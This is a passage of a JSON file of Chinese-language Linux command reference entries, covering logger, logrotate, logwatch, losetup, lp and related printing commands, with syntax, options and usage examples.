class=\"hljs-regexp\">/python2.7/</span>dist-packages<span class=\"hljs-regexp\">/twisted/</span>python<span class=\"hljs-regexp\">/test/</span>test_fakepwd.pyc\n<span class=\"hljs-regexp\">/usr/</span>lib<span class=\"hljs-regexp\">/syslinux/</span>pwd.c32\n<span class=\"hljs-regexp\">/usr/</span>share<span class=\"hljs-regexp\">/help/</span>C<span class=\"hljs-regexp\">/empathy/i</span>rc-<span class=\"hljs-keyword\">join</span>-pwd.page\n<span class=\"hljs-regexp\">/usr/</span>share<span class=\"hljs-regexp\">/help/</span>ca<span class=\"hljs-regexp\">/empathy/i</span>rc-<span class=\"hljs-keyword\">join</span>-pwd.page\n<span class=\"hljs-regexp\">/usr/</span>share<span class=\"hljs-regexp\">/help/</span>cs<span class=\"hljs-regexp\">/empathy/i</span>rc-<span class=\"hljs-keyword\">join</span>-pwd.page\n<span class=\"hljs-regexp\">/usr/</span>share<span class=\"hljs-regexp\">/help/</span>de<span class=\"hljs-regexp\">/empathy/i</span>rc-<span class=\"hljs-keyword\">join</span>-pwd.page\n<span class=\"hljs-regexp\">/usr/</span>share<span class=\"hljs-regexp\">/help/</span>el<span class=\"hljs-regexp\">/empathy/i</span>rc-<span class=\"hljs-keyword\">join</span>-pwd.page\n</code></pre>\n<p>实例2： 搜索etc目录下所有以sh开头的文件</p>\n<pre><code class=\"language-shell\">root ~ # locate <span class=\"hljs-regexp\">/etc/</span>sh\n<span class=\"hljs-regexp\">/etc/</span>shadow\n<span class=\"hljs-regexp\">/etc/</span>shadow-\n<span class=\"hljs-regexp\">/etc/</span>shells\n</code></pre>\n<p>实例3：搜索etc目录下，所有以m开头的文件</p>\n<pre><code class=\"language-shell\">root ~ # locate <span class=\"hljs-regexp\">/etc/m</span>\n<span class=\"hljs-regexp\">/etc/m</span>agic\n<span class=\"hljs-regexp\">/etc/m</span>agic.mime\n<span class=\"hljs-regexp\">/etc/m</span>ailcap\n<span class=\"hljs-regexp\">/etc/m</span>ailcap.order\n<span class=\"hljs-regexp\">/etc/m</span>anpath.config\n<span class=\"hljs-regexp\">/etc/m</span>ate-settings-daemon\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "logger",
        "des": "在系统日志中记录相应条目",
        "body": "<h1 id=\"logger\">logger</h1>\n<p>在系统日志中记录相应条目</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>logger命令</strong> 是用于往系统中写入日志，他提供一个shell命令接口到syslog系统模块</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">logger <span class=\"hljs-selector-attr\">[options]</span> <span class=\"hljs-selector-attr\">[message]</span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"> -<span class=\"hljs-string\">T</span>, <span class=\"hljs-built_in\">--tcp</span>             使用流连接(<span class=\"hljs-string\">TCP</span>)\n -<span class=\"hljs-string\">d</span>, <span class=\"hljs-built_in\">--udp</span>             使用数据报(<span class=\"hljs-string\">UDP</span>)\n -<span class=\"hljs-string\">i</span>, <span class=\"hljs-built_in\">--id</span>              逐行记录每一次<span class=\"hljs-string\">logger</span>的进程<span class=\"hljs-string\">ID</span>\n -<span class=\"hljs-string\">f</span>, <span class=\"hljs-built_in\">--file</span> &lt;<span class=\"hljs-string\">file</span>&gt;     记录特定的文件\n -<span class=\"hljs-string\">h</span>, <span class=\"hljs-built_in\">--help</span>            显示帮助文本并退出\n -<span class=\"hljs-string\">n</span>, <span class=\"hljs-built_in\">--server</span> &lt;<span class=\"hljs-string\">name</span>&gt;   写入指定的远程<span class=\"hljs-string\">syslog</span>服务器，使用<span class=\"hljs-string\">UDP</span>代替内装式<span class=\"hljs-string\">syslog</span>的例程\n -<span class=\"hljs-string\">P</span>, <span class=\"hljs-built_in\">--port</span> &lt;<span class=\"hljs-string\">port</span>&gt;     使用指定的<span class=\"hljs-string\">UDP</span>端口。默认的端口号是<span class=\"hljs-string\">514</span>\n -<span class=\"hljs-string\">p</span>, <span class=\"hljs-built_in\">--priority</span> &lt;<span class=\"hljs-string\">prio</span>&gt; 指定输入消息的优先级，优先级可以是数字或者指定为 <span class=\"hljs-string\">\" facility.level\"</span> 的格式。\n                       比如：<span class=\"hljs-string\">\" -p local3.info \"</span> <span class=\"hljs-string\">local3</span> 这个设备的消息级别为 <span class=\"hljs-string\">info</span>。\n                       默认级别是 <span class=\"hljs-string\">\"user.notice\"</span>\n -<span class=\"hljs-string\">s</span>, <span class=\"hljs-built_in\">--stderr</span>          输出标准错误到系统日志。\n -<span class=\"hljs-string\">t</span>, <span class=\"hljs-built_in\">--tag</span> &lt;<span class=\"hljs-string\">tag</span>&gt;       指定标记记录\n -<span class=\"hljs-string\">u</span>, <span class=\"hljs-built_in\">--socket</span> &lt;<span class=\"hljs-string\">socket</span>&gt; 写入指定的<span class=\"hljs-string\">socket</span>，而不是到内置系统日志例程。\n -<span class=\"hljs-string\">V</span>, <span class=\"hljs-built_in\">--version</span>         输出版本信息并退出\n</code></pre>\n<h3 id=\"例子\">例子</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">logger</span> -p syslog.<span class=\"hljs-literal\">info</span> <span class=\"hljs-string\">\"backup.sh is starting\"</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "login",
        "des": "登录系统或切换用户身份",
        "body": "<h1 id=\"login\">login</h1>\n<p>登录系统或切换用户身份</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>login命令</strong> 用于给出登录界面，可用于重新登录或者切换用户身份，也可通过它的功能随时更换登入身份。在Slackware发行版中&nbsp;，您可在命令后面附加欲登入的用户名称，它会直接询问密码，等待用户输入。当<code>/etc/nologin</code>文件存在时，系统只root帐号登入系统，其他用户一律不准登入。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">login</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-p：告诉login指令不销毁环境变量；</span>\n<span class=\"hljs-deletion\">-h：指定远程服务器的主机名。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>用户名：指定登录使用的用户名。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "logname",
        "des": "打印当前终端登录用户的名称。",
        "body": "<h1 id=\"logname\">logname</h1>\n<p>打印当前终端登录用户的名称。</p>\n<h2 id=\"概要\">概要</h2>\n<pre><code class=\"language-shell\">logname [<span class=\"hljs-symbol\">OPTION</span>]...\n</code></pre>\n<h2 id=\"主要用途\">主要用途</h2>\n<ul>\n<li>打印当前终端登录用户的名称。</li>\n</ul>\n<h2 id=\"选项\">选项</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\">--help       显示帮助信息并退出。</span>\n<span class=\"hljs-comment\">--version    显示版本信息并退出。</span>\n</code></pre>\n<h2 id=\"返回值\">返回值</h2>\n<p>返回0表示成功，返回非0值表示失败。</p>\n<h2 id=\"例子\">例子</h2>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># logname</span>\nroot\n</code></pre>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li><p>注意区分 <code>whoami</code> 和 <code>logname</code> 这两个命令；比如我们以用户 <code>root</code> 打开的终端，然后切换到了用户 <code>user2</code>。此时， <code>whoami</code>返回的是当前用户 <code>user2</code>, <code>logname</code> 返回的是 <code>root</code>，大家可以自行实践验证一下。</p>\n</li>\n<li><p>该命令是<code>GNU coreutils</code>包中的命令，相关的帮助信息请查看<code>man -s 1 logname</code>，<code>info coreutils 'logname invocation'</code>。</p>\n</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "logout",
        "des": "退出当前登录的Shell",
        "body": "<h1 id=\"logout\">logout</h1>\n<p>退出当前登录的Shell</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>logout命令</strong> 用于退出当前登录的Shell，logout指令让用户退出系统，其功能和login指令相互对应。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">logout</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "logrotate",
        "des": "系统日志进行轮转、压缩和删除",
        "body": "<h1 id=\"logrotate\">logrotate</h1>\n<p>系统日志进行轮转、压缩和删除</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>logrotate命令</strong> 用于对系统日志进行轮转、压缩和删除，也可以将日志发送到指定邮箱。使用logrotate指令，可让你轻松管理系统所产生的记录文件。每个记录文件都可被设置成每日，每周或每月处理，也能在文件太大时立即处理。您必须自行编辑，指定配置文件，预设的配置文件存放在<code>/etc/logrotate.conf</code>文件中。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">logrotate</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-?或--help：在线帮助；</span>\n<span class=\"hljs-deletion\">-d或--debug：详细显示指令执行过程，便于排错或了解程序执行的情况；</span>\n<span class=\"hljs-deletion\">-f或--force ：强行启动记录文件维护操作，纵使logrotate指令认为没有需要亦然；</span>\n<span class=\"hljs-deletion\">-s&lt;状态文件&gt;或--state=&lt;状态文件&gt;：使用指定的状态文件；</span>\n<span class=\"hljs-deletion\">-v或--version：显示指令执行过程；</span>\n<span class=\"hljs-deletion\">-usage：显示指令基本用法。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>配置文件：指定lograote指令的配置文件。</p>\n<h3 id=\"实例\">实例</h3>\n<p>crontab 会定时调用logrotate命令 在 <code>/etc/cron.daily/logrotate</code> 文件中配置使用</p>\n<p>logrotate的配置文件<code>/etc/logrotate.conf</code> 定义引用<code>/etc/logrotate.d</code>目录下的一些自定义的log配置 </p>\n<p>在<code>/etc/logrotate.d</code>目录下创建任意后缀名的文件,即可使用对日志进行轮转</p>\n<pre><code class=\"language-shell\">/tmp/<span class=\"hljs-keyword\">log</span>/<span class=\"hljs-keyword\">log</span>.txt\n{\n    copytruncate\n    daily\n    <span class=\"hljs-keyword\">rotate</span> 30\n    missingok\n    ifempty\n    <span class=\"hljs-keyword\">compress</span>\n    noolddir\n}\n</code></pre>\n<p>这个配置文件代表的意思是将<code>/tmp/log/log.txt</code>文件 进行轮转压缩</p>\n<pre><code>compress                 通过gzip 压缩转储以后的日志\nnocompress               不做gzip压缩处理\ncopytruncate             用于还在打开中的日志文件，把当前日志备份并截断；是先拷贝再清空的方式，拷贝和清空之间有一个时间差，可能会丢失部分日志数据。\nnocopytruncate 备份日志文件不过不截断\ncreate mode owner <span class=\"hljs-keyword\">group</span>  轮转时指定创建新文件的属性，如create <span class=\"hljs-number\">0777</span> nobody nobody\nnocreate                 不建立新的日志文件\ndelaycompress            和compress 一起使用时，转储的日志文件到下一次转储时才压缩\nnodelaycompress          覆盖 delaycompress 选项，转储同时压缩\nmissingok                如果日志丢失，不报错继续滚动下一个日志\nerrors address           专储时的错误信息发送到指定的Email 地址\nifempty                  即使日志文件为空文件也做轮转，这个是logrotate的缺省选项。\nnotifempty               当日志文件为空时，不进行轮转\nmail address             把转储的日志文件发送到指定的E-mail 地址\nnomail                   转储时不发送日志文件\nolddir directory         转储后的日志文件放入指定的目录，必须和当前日志文件在同一个文件系统\nnoolddir                 转储后的日志文件和当前日志文件放在同一个目录下\nsharedscripts            运行postrotate脚本，作用是在所有日志都轮转后统一执行一次脚本。如果没有配置这个，那么每个日志轮转后都会执行一次脚本\nprerotate                在logrotate转储之前需要执行的指令，例如修改文件的属性等动作；必须独立成行\npostrotate               在logrotate转储之后需要执行的指令，例如重新启动 (kill -HUP) 某个服务！必须独立成行\ndaily                    指定转储周期为每天\nweekly                   指定转储周期为每周\nmonthly                  指定转储周期为每月\n<span class=\"hljs-keyword\">rotate</span> count             指定日志文件删除之前转储的次数，<span class=\"hljs-number\">0</span> 指没有备份，<span class=\"hljs-number\">5</span> 指保留<span class=\"hljs-number\">5</span> 个备份\ndateext                  使用当期日期作为命名格式\ndateformat .%s           配合dateext使用，紧跟在下一行出现，定义文件切割后的文件名，必须配合dateext使用，只支持 %Y %m %d %s 这四个参数\n<span class=\"hljs-keyword\">size</span>(或minsize) <span class=\"hljs-keyword\">log</span>-<span class=\"hljs-keyword\">size</span> 当日志文件到达指定的大小时才转储\n</code></pre>\n<h3 id=\"注意事项\">注意事项</h3>\n<p>在<code>/etc/logrotate.d</code>目录下创建任意后缀名的文件</p>\n<pre><code class=\"language-shell\">/tmp/<span class=\"hljs-keyword\">log</span>/<span class=\"hljs-keyword\">log</span>*\n{\n    copytruncate\n    daily\n    <span class=\"hljs-keyword\">rotate</span> 30\n    missingok\n    ifempty\n    <span class=\"hljs-keyword\">compress</span>\n    noolddir\n}\n</code></pre>\n<p>这种情况下，会将轮转过的log再重新轮转,因为轮转过后的文件名也是已log开头的</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "logsave",
        "des": "将命令的输出信息保存到指定的日志文件",
        "body": "<h1 id=\"logsave\">logsave</h1>\n<p>将命令的输出信息保存到指定的日志文件</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>logsave命令</strong> 运行给定的命令，并将命令的输出信息保存到指定的日志文件中。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">logsave</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">-<span class=\"hljs-selector-tag\">a</span>：追加信息到指定的日志文件中。\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>  日志文件：指定记录运行信息的日志文件；</li>\n<li>  指令：需要执行的指令。</li>\n</ul>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "logwatch",
        "des": "可定制和可插入式的日志监视系统",
        "body": "<h1 id=\"logwatch\">logwatch</h1>\n<p>可定制和可插入式的日志监视系统</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>logwatch命令</strong> 是一个可定制和可插入式的日志监视系统，它通过遍历给定时间范围内的系统日志文件而产生日志报告。logwatch默认每天执行一次，可以从<code>/etc/cron.daily</code>里看到。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">logwatch</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\">--detail&lt;报告详细程度&gt;：指定日志报告的详细程度；</span>\n<span class=\"hljs-comment\">--logfile&lt;日志文件&gt;：仅处理指定的日志文件；</span>\n<span class=\"hljs-comment\">--service&lt;服务名&gt;：仅处理指定服务的日志文件；</span>\n<span class=\"hljs-comment\">--print：打印结果到标准输出；</span>\n<span class=\"hljs-comment\">--mailto&lt;邮件地址&gt;：将结果发送到指定邮箱；</span>\n<span class=\"hljs-comment\">--range&lt;日期范围&gt;：指定处理日志的日期范围；</span>\n<span class=\"hljs-comment\">--archives：处理归档日志文件；</span>\n<span class=\"hljs-comment\">--debug&lt;调试等级&gt;：调试模式；</span>\n<span class=\"hljs-comment\">--save&lt;文件名&gt;：将结果保存到指定文件中，而不显示或者发送到指定邮箱；</span>\n<span class=\"hljs-comment\">--logdir&lt;目录&gt;：指定查找日志文件的目录，而不使用默认的日志目录；</span>\n<span class=\"hljs-comment\">--hostname&lt;主机名&gt;：指定在日志报告中使用的主机名，不使用系统默认的主机名；</span>\n<span class=\"hljs-comment\">--numeric：在报告中显示ip地址而不是主机名；</span>\n<span class=\"hljs-comment\">--help：显示指令的帮助信息。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>检查你的主机上是否已经存在Logwatch（Redhat默认已经安装了Logwatch，不过版本比较旧）：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">rpm -qa logwatch</span>\n</code></pre>\n<p>如果主机上没有logwatch，则执行：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">rpm</span> -Ivh logwatch**<span class=\"hljs-regexp\">*.rpm</span>\n</code></pre>\n<p>如果有老版本的logwatch，则执行：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">rpm</span> -Uvh logwatch**<span class=\"hljs-regexp\">*.rpm</span>\n</code></pre>\n<p>安装完毕后，开始配置：</p>\n<p>可以修改和添加它的logfiles、services和其他配置，但默认已经有很多脚本了，只要在1）里设置<code>Detail = High</code>就可以了。</p>\n<ul>\n<li>  可以添加新的配置到<code>/etc/logwatch/conf/logwatch.conf</code></li>\n<li>  也可以修改<code>/usr/share/logwatch/default.conf/logwatch.conf</code></li>\n</ul>\n<p><code>/etc/logwatch/conf/</code>会自动覆盖<code>/usr/share/logwatch/default.conf/</code>下的同名文件。</p>\n<p>如果没有设置logwatch.conf也没关系，可以直接在命令行下设置。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\">logwatch</span> --<span class=\"hljs-comment\">detail</span> <span class=\"hljs-comment\">High</span> --<span class=\"hljs-comment\">Service</span> <span class=\"hljs-comment\">All</span> --<span class=\"hljs-comment\">range</span> <span class=\"hljs-comment\">All</span> --<span class=\"hljs-comment\">print</span>    <span class=\"hljs-comment\">基本就可以显示出所有日志的情况了</span>\n<span class=\"hljs-comment\">logwatch</span> --<span class=\"hljs-comment\">service</span> <span class=\"hljs-comment\">sshd</span> --<span class=\"hljs-comment\">detail</span> <span class=\"hljs-comment\">High</span>                       <span class=\"hljs-comment\">只看sshd的日志情况</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "look",
        "des": "显示文件中以指定字符串开头的任意行",
        "body": "<h1 id=\"look\">look</h1>\n<p>显示文件中以指定字符串开头的任意行</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>look命令</strong> 用于显示文件中以指定字符串开头的任意行。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">look</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-a：使用另一个字典文件web2，该文件也位于/usr/dict目录下；</span>\n<span class=\"hljs-deletion\">-d：只对比英文字母和数字，其余一概忽略不予比对；</span>\n<span class=\"hljs-deletion\">-f：忽略字符大小写差别；</span>\n<span class=\"hljs-deletion\">-t&lt;字尾字符串&gt;：设置字尾字符串。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>  字符串：指定要查找的字符串；</li>\n<li>  文件：指定要查找的目标文件。</li>\n</ul>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "losetup",
        "des": "设定与控制循环（loop）设备",
        "body": "<h1 id=\"losetup\">losetup</h1>\n<p>设定与控制循环（loop）设备</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>losetup命令</strong> 用来设置循环设备。循环设备可把文件虚拟成块设备，籍此来模拟整个文件系统，让用户得以将其视为硬盘驱动器，光驱或软驱等设备，并挂入当作目录来使用。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">losetup <span class=\"hljs-selector-attr\">[ -e encryption ]</span> <span class=\"hljs-selector-attr\">[ -o offset ]</span> loop_device file\nlosetup <span class=\"hljs-selector-attr\">[ -d ]</span> loop_device\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-a 显示所有循环设备的状态。</span>\n<span class=\"hljs-deletion\">-d 卸除设备。</span>\n<span class=\"hljs-deletion\">-e &lt;加密选项&gt; 启动加密编码 。</span>\n<span class=\"hljs-deletion\">-f 寻找第一个未使用的循环设备。</span>\n<span class=\"hljs-deletion\">-o &lt;偏移量&gt;设置数据偏移量，单位是字节。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>  loop_device：循环设备可以是/dev/loop0, /dev/loop1 ... /dev/loop7。</li>\n<li>  file：要与循环设备相关联的文件名，这个往往是一个磁盘镜象文件，如 *.img</li>\n</ul>\n<h3 id=\"loop设备介绍\">loop设备介绍</h3>\n<p>在类 UNIX 系统里，loop 设备是一种伪设备(pseudo-device)，或者也可以说是仿真设备。它能使我们像块设备一样访问一个文件。在使用之前，一个 loop 设备必须要和一个文件进行连接。这种结合方式给用户提供了一个替代块特殊文件的接口。因此，如果这个文件包含有一个完整的文件系统，那么这个文件就可以像一个磁盘设备一样被 mount 起来。</p>\n<p>上面说的文件格式，我们经常见到的是 cd 或 DVD 的 ISO 光盘镜像文件或者是软盘(硬盘)的 *.img 镜像文件。通过这种 loop mount (回环mount)的方式，这些镜像文件就可以被 mount 到当前文件系统的一个目录下。</p>\n<p>至此，顺便可以再理解一下 loop 之含义：对于第一层文件系统，它直接安装在我们计算机的物理设备之上；而对于这种被 mount 起来的镜像文件(它也包含有文件系统)，它是建立在第一层文件系统之上，这样看来，它就像是在第一层文件系统之上再绕了一圈的文件系统，所以称为 loop。</p>\n<h3 id=\"实例\">实例</h3>\n<p>创建空的磁盘镜像文件，这里创建一个1.44M的软盘：</p>\n<pre><code class=\"language-shell\">dd <span class=\"hljs-attribute\">if</span>=/dev/zero <span class=\"hljs-attribute\">of</span>=floppy.img <span class=\"hljs-attribute\">bs</span>=512 <span class=\"hljs-attribute\">count</span>=2880\n</code></pre>\n<p>使用 losetup将磁盘镜像文件虚拟成快设备：</p>\n<pre><code class=\"language-shell\">losetup <span class=\"hljs-regexp\">/dev/</span>loop1 floppy.img\n</code></pre>\n<p>挂载块设备：</p>\n<pre><code class=\"language-shell\">mount <span class=\"hljs-regexp\">/dev/</span>loop0 /tmp\n</code></pre>\n<p>经过上面的三步之后，我们就可以通过/tmp目录，像访问真实快设备一样来访问磁盘镜像文件floppy.img。</p>\n<p>卸载loop设备：</p>\n<pre><code class=\"language-shell\">umount /tmp\nlosetup -d <span class=\"hljs-regexp\">/dev/</span>loop1\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "lp",
        "des": "打印文件或修改排队的打印任务",
        "body": "<h1 id=\"lp\">lp</h1>\n<p>打印文件或修改排队的打印任务</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>lp命令</strong> 用于打印文件，或者修改排队的打印任务。与lpr命令类似，lp命令既支持文件输入也支持标准输入。它与lpr的不同之处在于它有一个不同（稍微复杂点）的参数选项设置。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">lp</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-E：与打印服务器连接时强制使用加密；</span>\n<span class=\"hljs-deletion\">-U：指定连接打印服务器时使用的用户名；</span>\n<span class=\"hljs-deletion\">-d：指定接收打印任务的目标打印机；</span>\n<span class=\"hljs-deletion\">-i：指定一个存在的打印任务号；</span>\n<span class=\"hljs-deletion\">-m：打印完成时发送E-mail；</span>\n<span class=\"hljs-deletion\">-n：指定打印的份数；</span>\n<span class=\"hljs-deletion\">-t：指定打印任务的名称；</span>\n<span class=\"hljs-deletion\">-H：指定打印任务开始的时间；</span>\n<span class=\"hljs-deletion\">-P：指定需要打印的页码。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件：需打印的文件。</p>\n<h3 id=\"实例\">实例</h3>\n<p>要在连接在设备dlp0上的打印机lp0上打印文件<code>/etc/motd</code>，请输入：</p>\n<pre><code class=\"language-shell\">lp <span class=\"hljs-regexp\">/etc/m</span>otd\n</code></pre>\n<p>要使用文件的一个副本打印<code>/etc/motd</code>文件的30个副本，并且要用邮件通知用户作业完成，请输入：</p>\n<pre><code class=\"language-shell\">lp -c -m -n30 -dlp0:lpd0 <span class=\"hljs-regexp\">/etc/m</span>otd\n</code></pre>\n<p>要使用后端标志-f和-a并带上作业标题blah打印<code>/etc/motd</code>文件，请输入：</p>\n<pre><code class=\"language-shell\">lp -t <span class=\"hljs-string\">\"blah\"</span> -o -f -o -a <span class=\"hljs-regexp\">/etc/m</span>otd\n</code></pre>\n<p>要排队MyFile文件并返回作业编号，请输入：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">lp myfile</span>\n</code></pre>\n<p>要排队MyFile文件并禁止作业编号，请输入：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">lp -s myfile</span>\n</code></pre>\n<p> <strong>退出状态</strong> </p>\n<p>该命令返回以下退出值：</p>\n<ul>\n<li>  0：所有输入文件成功处理。</li>\n<li><blockquote>\n<p>0：没有输出设备可用，或者出现一个错误。</p>\n</blockquote>\n</li>\n</ul>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "lpadmin",
        "des": "配置CUPS套件中的打印机和类",
        "body": "<h1 id=\"lpadmin\">lpadmin</h1>\n<p>配置CUPS套件中的打印机和类</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>lpadmin命令</strong> 用于配置CUPS套件中的打印机和类，也被用来设置打印服务器默认打印机。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">lpadmin</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-c：将打印机加入类；</span>\n<span class=\"hljs-deletion\">-i：为打印机设置“system V”风格的接口脚本；</span>\n<span class=\"hljs-deletion\">-m：从mode目录设置一个标准的“system V”接口脚本或“PPD”文件；</span>\n<span class=\"hljs-deletion\">-o：为“PPD”或服务器设置选项；</span>\n<span class=\"hljs-deletion\">-r：从类中删除打印机；</span>\n<span class=\"hljs-deletion\">-u：设置打印机用户级的访问控制；</span>\n<span class=\"hljs-deletion\">-D：为打印机提供一个文字描述；</span>\n<span class=\"hljs-deletion\">-E：允许打印机接受打印任务；</span>\n<span class=\"hljs-deletion\">-L：为打印机位置提供一个文字描述；</span>\n<span class=\"hljs-deletion\">-P：为打印机指定一个ppd描述文件；</span>\n<span class=\"hljs-deletion\">-p：指定要配置的打印机名称；</span>\n<span class=\"hljs-deletion\">-d：设置默认打印机。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>打印机：指定要配置的打印机的名称。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "lpc",
        "des": "命令行方式打印机控制程序",
        "body": "<h1 id=\"lpc\">lpc</h1>\n<p>命令行方式打印机控制程序</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>lpc命令</strong> 式命令行方式打印机控制程序，有5个内置命令。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">lpc</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-comment\"># lpc</span>\nlpc&gt; ?         \n命令可能是缩写。命令是：\n\n<span class=\"hljs-keyword\">exit</span>    help    quit    status  ?\nlpc&gt; <span class=\"hljs-keyword\">exit</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "lpq",
        "des": "显示打印队列中的打印任务的状态信息",
        "body": "<h1 id=\"lpq\">lpq</h1>\n<p>显示打印队列中的打印任务的状态信息</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>lpq命令</strong> 用于显示打印队列中的打印任务的状态信息。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">lp<span class=\"hljs-string\">q(选项)</span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-E：强制使用加密方式与服务器连接；</span>\n<span class=\"hljs-deletion\">-P：显示中的打印机上的打印队列状态；；</span>\n<span class=\"hljs-deletion\">-U：自动可选的用户名；</span>\n<span class=\"hljs-deletion\">-a：报告所有打印机的定义任务；</span>\n<span class=\"hljs-deletion\">-h：指定打印服务器信息；</span>\n<span class=\"hljs-deletion\">-l：使用长格式输出；</span>\n<span class=\"hljs-addition\">+：指定显示状态的间隔时间。</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "lpr",
        "des": "将文件发送给指定打印机进行打印",
